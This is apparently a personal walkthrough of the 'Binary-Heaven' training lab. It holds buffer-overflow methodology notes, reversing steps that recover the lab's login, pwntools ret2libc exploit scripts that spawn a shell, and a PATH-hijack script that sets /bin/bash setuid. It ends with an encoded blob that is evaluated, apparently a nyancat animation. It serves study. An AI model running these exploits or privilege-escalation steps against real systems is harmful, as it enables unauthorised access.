# Binary-Heaven Helped-Through

Name: Binary-Heaven
Date:  19/01/2024
Difficulty:  Easy
Goals:  
- Gentle steps into Binary Exploitation Mountain
- Learn some:
	- BinEx
	- ASM
	- C
	- Methodology
	- Tools: `r2`, `gdb+gef`
Learnt:
- angr exists
- more pwntools
- simplifications of thinking and and thinking about exploitation
- more gdb and gef
- How to enumer, exfil and patch binaries with exfiled libraries  
Beyond Root:
- Pre-Watching Video past the introduction - recite the exact way to exploit this as if it is a PWK200+ machine 
- Create a list of what I need to know - DONE 
- Watch the [CryptoCat intro binary Exploitation series](https://www.youtube.com/watch?v=wa3sMSdLyHw&list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94) - One a day to make the brain not drain
- `GBD + GEF` + `r2` cheatsheet updated slightly - done 
- [[Compiled-Helped-Thorough]] - NEXT
- [[PWN100-Helped-Thorough]] - 1 hour max per task - Writeup 
-  Made automation for extracting all the information from a ELF binary

- [[Binary-Heaven-Notes.md]]
- [[Binary-Heaven-CMD-by-CMDs.md]]


## Stack Based BufferOverflow Recital

 - [THM - Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep), but use this to follow along [VOD](https://www.youtube.com/watch?v=eLIRjcI5eYU)
 - [Alh4zr3d OSCP x86 Buffer Overflow](https://www.youtube.com/watch?v=Z2pQuGmFNrM) - older but still very relevant and there are keys points of stages of exploit development that is easy to remember from this video as Al has a talent for the big picture and the helping you remember the mental and domain specific weird issues. 

- If this exam like OSCP firstly you would want to nmap all ports 
- The indicator you are looking for is a SMB or NFS share and a custom port or a port of known vulnerable application that is binary hosted on that share.
- If there is a share either there will be a source code or a binary
	- If binary: use `checksec` from pwntools on the binary if there is a binary as OSCP will require absolute no evasion in memory from the various defences developed over the decades if there are defences then it is a rabbit hole relative to the scope of OSCP.
	- If source code use static analysis looking for vulnerable c function like `strcopy` or a `scanf` that is passed to `[]char` buffer without input validation ( checking the size of the string passed to the buffer)
		- Yes `printf("%p")` and other are vulnerable, but it is best to try not rabbit hole in memorising all the vulnerable C functions when it comes to static analysis - it more about understand the control flow first as maybe there is a rabbit hole where that code does not ever get executed. Summary methodical in control flow analysis just..
		- Dork the functions - with experience some functions will naturally be remembered as being vulnerable, BUT IF THEY ARE NOT IN THE CONTROL FLOW OFFSEC MACHINE DEVELOPER ARE MASTER TROLLS IN THE RABBIT HOLE DEPARTMENT
	- Double check the same port is being opened! that from your nmap scan - rescan with `-sS and -Pn  and -p PORT` and do something else to be time efficient  
- If it 99.9% vulnerable run you hypervisor of choice with 2 VMs: target Windows or Linux VM and Kali Linux VM on a internal network so you do not accidentally exploit the exam machine
	- Debuggers:
		- Windows - Mona and Immunity are the best choice (mona is installed with Immunity)
		- Linux -  GBD and GEF 
		- As generally good John Hammond advise it is wise to do a couple of machines without using the automated bad character enumeration for the sake of learning to read the stack, hex, understanding where your code is actually doing to go and do and how bad characters can be guessed based on the application to save some time.
- The best methodology for exploit development from content creators that I have used myself is the one used in the [THM - Buffer Overflow Prep](https://tryhackme.com/room/bufferoverflowprep), Tiberious is awesome , but John Hammond is the king of methodology here follow along with this [VOD](https://www.youtube.com/watch?v=eLIRjcI5eYU). I am guessing this methodology is used in the EXP-30X+ that John has passed so it is battle tested and potentially not John's, but he explains it so clearly and simply that nothing really compares. Essential this methodology is the following:
	- Have separate template scripts for every step
	- Use pwntools for endianess or his `struct` function - sometimes compatibility and updates break packages alternatives are vital. Similar to reading the hex manually getting the experience both ways will cut through the course material, other people explanations, and the complexity of this subject matter. 
- If compiling from source and there .so or .dlls on the share compile using those library files and any instructions given **do not create a different puzzle than intended to then solve**  
- Fuzz the buffer - if you are not compiling from source if you are skip use brain! 
- Enumerate EIP - instruction pointer where our address we will point jmp to on the stack will either execute a nopsled to our code or our shellcode mostly likely the former
	- `msf-pattern_create` and `msf-pattern_offset` to create the pattern and then get the address
	- Mona and GEF can get the address also this for you!Just use the `msf-pattern_create` in the second script 
- Now we enumerate bad characters - John Hammond video has the best method for this
- DO THE MATHES
- Shell code 
	- Mathmatics of (Information on AV/AMSI do you actually have or get) x Size of the Buffer   
	- Context:
		- Is snmp running and you know they is AV on the box, because snmp will declare it in the mibs
		- Is there some information in the share about running the service that gives clues as to how it is being run
	- Do you really want to risk it there are only so many reset, but still chill out and HAVE ALTERNATIVES - you have lots of alternatives:
		- Stagers  
			- Custom LOLBIN or powershell to download and execute
			- C2/metasploit - beware some C2 stagers are large 
		- msfvenom still works, but meterpreter is not a good idea - more signatures and burns you meterpreter
		- packetstorm has windows shellcode for adding a user
		- We can always add a user if the service is running as NT SYSTEM or Administrator account AV cant block `net` command running what has been configured to be a 
		- AMSI exists, but not on older Machines 
		- Force a new process with if some weird crash 
 
## XCT as a Blueprint and Parasocial Mentor

[XCT](https://www.youtube.com/watch?v=UnZj5zzcBG4) is awesome.

I decided to start by laying the foundation for get data with some automation

Then `gdb` and `gef` or `r2` 
![1080](pdfatmain.png)


![1080](readthedecompilationlikepossiblywell.png)

`r2` command syntax is `letter` then `letter`
```c
d // debug commands
ds // step one instruction
db 0x55dc2082e21f// breakpoint at address
dr //show registers

```
Demonstrating register changes:  
![](registerobservationtesting.png)

- How to deal with scanf in `r2` and `gef`

#### XCT's approach

I was using gef so did not recieve the do to youtube link, yes I did with `strings`, but not with `gef` so tool anxiety and `pwndbg` vs `gef` question asking starts.

For Kali Linux 
```bash
python3 -m venv myenv
source myenv/bin/activate
pip install angr
```

Also learnt about angr
```python
import angr
import sys

# Author XCT from https://www.youtube.com/watch?v=UnZj5zzcBG4

# Use symbolic execution to explore all flow control possibilities of a program
# Then print out all the deadends of these explored states
def main(argv):
    binary = "CHANGE THIS"
    project = angr.Project(binary)
    init = project.factory.entry_state()
    simulation_manager = project.factory.simgr(init)
    simulation_manager.explore()
    for state in simulation_manager.deadended:
        print(state.posix.dumps(sys.stdin.fileno()))

if __name__ == '__main__':
    main(sys.argv)
```

xct - on bigger binaries is can break

- Have checked low-hanging fruit and subtle variants?
	- What Programming Language are the `strings`?
- Have you ran the binary?
- Have you used [[angr]]?


What is the username?
```
guardian
```

I used `gef`, but I am eyeing up `pwndbg` for the heap exploitation of the future 
![](breakonmainandrun.png)

```c
break main.main
run
disassemble
```

![](ooooodisassemblingmain.png)
The `fscanln` is then `cmp rcx 0xb`, we need eleven characters
![](xctpossiblecomparisonforpassword.png)

```
break *0x00000000004a54b6
c // FOR CONTINUE
```
![1080](incompletepasswordincspectaddress.png)
Hey pwndbg was missing the exclamation mark

What is the password?
```
GOg0esGrrr!
```

## Exploiting `pwn_me` binary

![](analysisofthepwnmemainfuncpng.png)

![](systemisatthisaddressinmemory.png)

![](dontgettopoexcitedlookatthehistory.png)

Forgot about `ldd` and did not know you patch a file to only use local binaries
```bash
ldd $binary
# Patched the bianry with only local library (From the host that binary was compiled!)
# Copy the libraries to your machine!


# Change the DT_RUNPATH of the executable or library to RUNPATH.
patchelf --set-rpath . $binary # Very important!!!
# Change the dynamic loader ("ELF interpreter") of executable given to INTERPRETER.
patchelf --set-interpreter ld-linux.so.2 $binary
```
[patchelf](https://man.archlinux.org/man/extra/patchelf/patchelf.1.en)

![](libcforourlocaldirectoryisused.png)

Learning Pwntools
```python
from pwn import *
import struct

context.terminal = ['tmux', 'new-window']
target = './pwn_me'
context.binary = target
binary = ELF(target)
libc = ELF("./libc.so.6")

ssh_host = '10.10.232.171'
ssh_user = 'guardian'
ssh_pass = 'GOg0esGrrr!'
ssh_port = 22

if args['SSH']:
    sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)
    p = sh.run('/bin/bash')
    junk = p.recv(4096,timeout=2)
    p.sendline(target)
else:
    p = process(target,setuid=True)

p.interactive()
```

```python
context.terminal = ['alacritty', '-e', 'zsh', '-c']
```

```python
from pwn import *
import struct

context.terminal = ['tmux', 'new-window']
target = './pwn_me'
context.binary = target
binary = ELF(target)
libc = ELF("./libc.so.6")

ssh_host = '10.10.232.171'
ssh_user = 'guardian'
ssh_pass = 'GOg0esGrrr!'
ssh_port = 22

if args['SSH']:
    sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)
    p = sh.run('/bin/bash')
    junk = p.recv(4096,timeout=2)
    p.sendline(target)
else:
    p = process(target,setuid=True)


p.recvline()
leak = p.recvline()[-11:].rstrip(b"\n")
system = int(leak[2:],16)
log.info(hex(system))
libc.address = system - libc.symbols['system']

p.interactive()

```

![](grabsystemaddressleak.png)


```python
from pwn import *
import struct

context.terminal = ['tmux', 'new-window']
target = './pwn_me'
context.binary = target
binary = ELF(target)
libc = ELF("./libc.so.6")

ssh_host = '10.10.232.171'
ssh_user = 'guardian'
ssh_pass = 'GOg0esGrrr!'
ssh_port = 22

if args['SSH']:
    sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)
    p = sh.run('/bin/bash')
    junk = p.recv(4096,timeout=2)
    p.sendline(target)
else:
    p = process(target,setuid=True)


p.recvline()
leak = p.recvline()[-11:].rstrip(b"\n")
system = int(leak[2:],16)
log.info(hex(system))
libc.address = system - libc.symbols['system']

buffer = b""
buffer += b"A"*100
gdb.attach(p, gdbscript='continue')
p.sendline(buffer)

p.interactive()

```

![](attactedfrompwntoolstogdb.png)

```bash
msf-pattern_create -l 100 
```

```python
from pwn import *
import struct

context.terminal = ['tmux', 'new-window']
target = './pwn_me'
context.binary = target
binary = ELF(target)
libc = ELF("./libc.so.6")

ssh_host = '10.10.232.171'
ssh_user = 'guardian'
ssh_pass = 'GOg0esGrrr!'
ssh_port = 22

if args['SSH']:
    sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)
    p = sh.run('/bin/bash')
    junk = p.recv(4096,timeout=2)
    p.sendline(target)
else:
    p = process(target,setuid=True)


p.recvline()
leak = p.recvline()[-11:].rstrip(b"\n")
system = int(leak[2:],16)
log.info(hex(system))
libc.address = system - libc.symbols['system']

buffer = b""
buffer += b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
gdb.attach(p, gdbscript='continue')
p.sendline(buffer)

p.interactive()

```

![](sentpattern.png)

```bash
	# cat 0x31624130
msf-pattern_offset -l 100 -q 0x31624130
[*] Exact match at offset 32
```

Because we have the address of `system()` from c 
```python
from pwn import *
import struct

context.terminal = ['tmux', 'new-window']
target = './pwn_me'
context.binary = target
binary = ELF(target)
libc = ELF("./libc.so.6")

ssh_host = '10.10.232.171'
ssh_user = 'guardian'
ssh_pass = 'GOg0esGrrr!'
ssh_port = 22

if args['SSH']:
    sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)
    p = sh.run('/bin/bash')
    junk = p.recv(4096,timeout=2)
    p.sendline(target)
else:
    p = process(target,setuid=True)


p.recvline()
leak = p.recvline()[-11:].rstrip(b"\n")
system = int(leak[2:],16)
log.info(hex(system))
libc.address = system - libc.symbols['system']

buffer = b""
buffer += b"A"*32
buffer += p64(libc.symbols['system'])
buffer += p64(next(libc.search(b'/bin/sh\x00')))

gdb.attach(p, gdbscript='continue')
p.sendline(buffer)

p.interactive()

```

GEF however unlike pwndbg did not print what process other than the pid had been spawned 
![](itworks.png)
## Privilege Escalation To BinexGod

![](binexgodindeed.png)

## Privilege Escalation to root
Home directory:
![](homeofbinexgod.png)

vuln.c
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo Get out of heaven lol");
}
```

[xct](https://github.com/xct) very simple, effective and easy to clean up  `+s` to `/bin/bash`
```bash
echo "#!/bin/bash\nchmod u+s /bin/bash" > $fakebinary
chmod u+x $fakebinary
PATH=`pwd`:$PATH ./vulnerble
```

![](root.png)

```bash
#!/bin/bash


METANYAN="$(cat <<'EOT'
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
5Lbb9Oxfv379D5cBOcrUGAEA
EOT
)"
eval $(echo $METANYAN | tr ' ' '\n' | base64 -d | gunzip)

declare -A COL
COL=([a]=16 [b]=24 [c]=196 [d]=82 [e]=208 [f]=226 [g]=63 [h]=200 [i]=33 [j]=246 [k]=222 [l]=213 [m]=231 [n]=210 [o]=-1)

declare -A PALETTE
PALETTE=([16]="0000/0000/0000"
         [24]="0000/3333/6666"
        [196]="FFFF/0000/0000"
         [82]="3333/FFFF/0000"
        [208]="FFFF/9999/0000"
        [226]="FFFF/FFFF/0000"
         [63]="6666/3333/FFFF"
        [200]="FFFF/3333/9999"
         [33]="0000/9999/FFFF"
        [246]="9999/9999/9999"
        [222]="FFFF/CCCC/9999"
        [213]="FFFF/9999/FFFF"
        [231]="FFFF/FFFF/FFFF"
        [210]="FFFF/9999/9999")

for color in ${COL[@]}; do
 echo -en "\033]4;$color;rgb:${PALETTE[$color]}\033\\"
done


PIXEL=" "
SAVECURSOR=$'\0337'
HIDECURSOR=$'\033[?25l'
RESTORECURSOR=$'\0338\033[?12;25h'
QUERYCURSOR=$'\033[6n'

LINES=$(tput lines)
COLUMNS=$(tput cols)
YOFFSET=$(((70-LINES)/2))
YOFFSET=$[ $YOFFSET > 0 ? $YOFFSET+1 : 0 ]
WIDTH=$((COLUMNS / 70 ))
for ((i=0; i<WIDTH; i++)); do
  CHAR+=${PIXEL}
done

CACHE=$(mktemp -d --suffix __NYANCAT)

trap 'exit 1' INT TERM
trap 'rm -rf "${CACHE}"; echo -n $RESTORECURSOR' EXIT

#echo -n $HIDECURSOR

for ((y=YOFFSET; y<70-YOFFSET; y++)); do
  oldpixel=-1
  for ((x=0; x<70; x++)); do
    pixel=${NYAN[y]:x:1}
    if [[ $pixel == $oldpixel ]]; then
      echo -n "$CHAR"
    else
      echo -en "\033[0;48;5;${COL[${pixel}]}m$CHAR"
    fi
    oldpixel=$pixel
  done
  echo $'\033[0m'
done

stty -echo -icanon
echo -n $QUERYCURSOR 1>&2
read -s -dR POS
stty echo icanon

CURSORHOME=$((${POS:2:${#POS}-4} - y))
echo -n $SAVECURSOR

for ((f=1; f<=12; f++)); do
  for ((y=YOFFSET; y<70-YOFFSET; y++)); do
    stride=$((y+f*70))
    for ((x=0; x<70; x++)); do
      pixel=${NYAN[stride]:x:1}
      if [[ $pixel == o ]]; then
        continue
      else
        echo -en "\033[0$((CURSORHOME+y));$((x*WIDTH+1))H\033[0;48;5;${COL[${pixel}]}m$CHAR\033[0m" >> $CACHE/frame_${f}
      fi
      oldx=$x; oldy=$y
    done
  done
done
echo -n $RESTORECURSOR

while true; do
  for ((f=1; f<=12; f++)); do
    cat $CACHE/frame_${f}
    sleep 0.06
  done

done
```

![](truelyanamazingmachine.png)
## Post-Root-Reflection  

WTF I NEED:
- How to deal with scanf in `r2` and `gef` - done for `gdb` and `gef`, which to me is more important
- Never doubt the python virtual environments

- Amazing machine
- Learnt much from [xct](https://github.com/xct) , [lammm](https://tryhackme.com/p/lammm) and [swanandx](https://tryhackme.com/p/swanandx)

## Beyond Root

- See Recital section

- 
Gef UTLRA cheatsheet
```c
# Break at entry point
entry-break
# dump assemble code at the current point 
disassemble
# Set a breakpoint at a function call 
break $funcHandle.$funcHandle
# Set breakpoint at memory address
break *0x000133780085
run
```